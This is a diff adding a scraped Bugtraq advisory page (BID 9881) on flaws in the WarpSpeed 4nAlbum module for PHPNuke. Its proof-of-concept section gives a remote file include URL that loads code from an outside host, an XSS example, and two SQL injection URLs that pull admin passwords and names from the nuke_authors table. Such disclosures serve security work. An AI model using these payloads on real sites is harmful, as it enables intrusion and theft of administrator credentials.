@@ -1,0 +1,95 @@
+#SpeeDr00t@Black Falcon<br>#bid9881<p><b><span style="font-size: 18pt;">WarpSpeed 4nAlbum Module For PHPNuke Multiple Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/9881/info">info</a><br><a href="http://www.securityfocus.com/bid/9881/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/9881/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/9881/solution">solution</a><br><a href="http://www.securityfocus.com/bid/9881/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				9881
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Mar 15 2004 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Mar 15 2004 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Disclosure of these issues is credited to Janek Vind &lt;come2waraxe@yahoo.com&gt;.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					WarpSpeed 4nAlbum Module 0.92 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following proof of concept was provided:<br/><br/>To leverage the remote file include:<br/>http://www.example.com/phpNukeDirectory/modules/4nalbum/public/displaycategory.php?basepath=http://www.example.net/<br/><br/>Where the attacker would have to have malicious code in the script 'http://www.example.net/public/imageFunctions.php' <br/><br/>To leverage the cross-site scripting issue:<br/>http://www.example.com/phpNukeDirectory/modules/4nalbum/public/nmimage.php?z=xss code here<br/><br/>To leverage the SQL injection issue:<br/>http://www.example.com/phpNukeDirectory/modules.php?op=modload&amp;name=4nAlbum&amp;file=index&amp;do=showgall&amp;gid=-99%20UNION%20SELECT%20null,null,pwd,2,null,null,null%20FROM%20nuke_authors/*<br/>http://www.example.com/phpNukeDirectory/modules.php?op=modload&amp;name=4nAlbum&amp;file=index&amp;do=showgall&amp;gid=-99%20UNION%20SELECT%20null,null,aid,2,null,null,null%20FROM%20nuke_authors/*
+	
+		<ul>
+</ul>
+</div>
